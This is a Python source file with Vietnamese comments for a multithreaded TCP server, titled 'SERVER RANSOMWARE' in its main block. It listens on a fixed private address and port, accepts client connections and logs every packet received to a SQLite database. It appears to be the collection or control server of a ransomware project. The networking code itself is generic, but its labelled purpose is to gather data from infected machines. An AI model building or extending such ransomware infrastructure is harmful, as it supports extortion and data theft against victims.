# Import modules
from time import sleep
from threading import Thread
from modules.system import System, Console
from modules.sqlite import SqliteLog
from socket import socket, AF_INET, SOCK_STREAM

# Lớp Server để xử lý các kết nối và truyền dữ liệu
class Server:

    def __init__(self, host: str, port: int) -> None:
        self.log: SqliteLog = SqliteLog()
        self.host: str = host
        self.port: int = port
        self.server: socket = socket(AF_INET, SOCK_STREAM)


    # Xử lý dữ liệu từ mỗi client
    def HandleClient(self, client: socket, address) -> None:
        while True:
            try:
                data: bytes = client.recv(4096)
                if not data:
                    break
                if not isinstance(data, bytes): 
                    data = data.encode()
                self.log.activity(address[0], data)
                Console(address[0], 
                        f'Packet data: {round(len(data)/1024, 3)} KB',
                        'Yellow')
            except Exception as error:
                Console(address[0], error, 'Red')
                break
        client.close()
        Console(address[0], 'Disconnect', 'Blue')


    # Xử lý các kết nối đến server
    def HandleConnections(self) -> None:
        while True:
            client, address = self.server.accept()
            Console(address[0], None, 0)
            thread = Thread(target=self.HandleClient, args=(client, address))
            thread.start()


    # Bắt đầu lắng nghe các kết nối đến server
    def Listening(self) -> None:
        try:
            self.server.bind((self.host, self.port))
            self.server.listen()
            Console(self.host, 'The server starts listening', 'Green')
            thread = Thread(target=self.HandleConnections)
            thread.start()
        except:
            Console(self.host, 'Address already in use', 'Red')


# Hàm main để khởi tạo server và bắt đầu lắng nghe các kết nối
if __name__ == '__main__':
    Terminal = System()
    try:
        Terminal.clear()
        Terminal.title('SERVER RANSOMWARE')
        Terminal.size(320, 240)
        Terminal.init()
        Server('192.168.1.12', 19100).Listening()
    except Exception as error:
        Console('127.0.0.0', error, 'Red')
        sleep(10)
        Terminal.reset()